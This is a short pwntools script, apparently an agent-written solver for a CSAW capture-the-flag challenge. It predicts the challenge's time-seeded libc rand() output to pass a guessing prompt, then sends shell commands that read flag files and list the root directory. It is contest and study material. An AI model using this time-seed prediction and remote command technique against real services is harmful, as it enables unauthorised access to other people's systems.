from pwn import *
import ctypes, time

context.log_level = 'error'
libc = ctypes.CDLL("libc.so.6")

def predict(seed):
    libc.srand(ctypes.c_uint(seed))
    return libc.rand() % 0x100000

for attempt in range(60):
    try:
        p = remote("pwn.chal.csaw.io", 5000, timeout=5)
        # try guesses across a small window of possible seeds
        now = int(time.time())
        for seed in (now, now+1, now+2):
            p.sendlineafter(b"Which haystack do you want to check?", str(predict(seed)).encode())
            data = p.recvuntil(b"check?\n", timeout=2)
            if b"found a needle! And its number is 0x1337" in data:
                break
        p.sendline(b"cat flag.txt; cat /flag.txt; ls /")
        time.sleep(0.5)
        out = p.recvrepeat(2)
        print(out.decode(errors="replace"))
        if b"flag{" in out.lower() or b"flag{" in out:
            break
        p.close()
    except Exception as e:
        print("attempt %d: %s" % (attempt, e))
        try: p.close()
        except: pass
end_of_edit

